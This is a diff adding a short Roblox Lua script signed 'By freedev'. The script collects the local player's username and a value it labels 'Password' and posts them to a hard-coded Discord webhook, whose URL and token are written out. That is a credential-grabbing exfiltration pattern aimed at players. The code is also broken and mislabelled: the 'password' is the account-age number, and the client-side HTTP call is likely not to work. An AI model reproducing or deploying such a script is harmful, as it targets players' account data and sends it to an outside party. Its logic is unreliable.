@@ -1,0 +1,20 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local WebhookUrl = "https://discord.com/api/webhooks/1243244982907961344/7GuxPpOb1Nj6OtAZgh-oGD3YCrE0fV64rEXXntcBkI9c6qHW3--NS2F0z8Dm188cDLw4"
+
+
+local player = Players.LocalPlayer
+local username = player.Name
+local password = player.AccountAge
+
+
+local payload = {
+    content = string.format("Username: %s\nPassword: %d", username, password)
+}
+local headers = {
+    ["Content-Type"] = "application/json"
+}
+local response = HttpService:PostAsync(WebhookUrl, HttpService:JSONEncode(payload), headers)
+
+
+print("«By freedev» ")
